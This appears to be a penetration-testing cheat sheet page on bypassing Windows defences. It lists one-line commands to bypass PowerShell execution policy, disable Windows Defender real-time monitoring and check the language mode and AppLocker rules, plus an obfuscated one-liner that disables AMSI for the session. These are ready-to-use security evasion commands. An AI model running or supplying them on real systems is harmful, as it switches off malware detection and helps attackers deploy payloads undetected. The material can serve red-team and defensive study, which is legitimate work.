---
description: >-
  PowerShell Execution Policy, Anti-Virus (Windows Defender), The Windows
  Antimalware Scan Interface (AMSI), AppLocker and other defenses.
---

# Bypassing Windows Defenses

## Bypass PowerShell Execution policy

```text
powershell -ep bypass
```

## Disable AV - Windows Defender

Completely disable Anti-virus. Need **admin privs.**

```text
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Disable AMSI

Disable AMSI for current session

```text
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

## Constrained Language Mode

Check the Language Mode used in current context

```text
$ExecutionContext.SessionState.LanguageMode 
```

## App Locker Policy

Get App Locker rules

```text
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

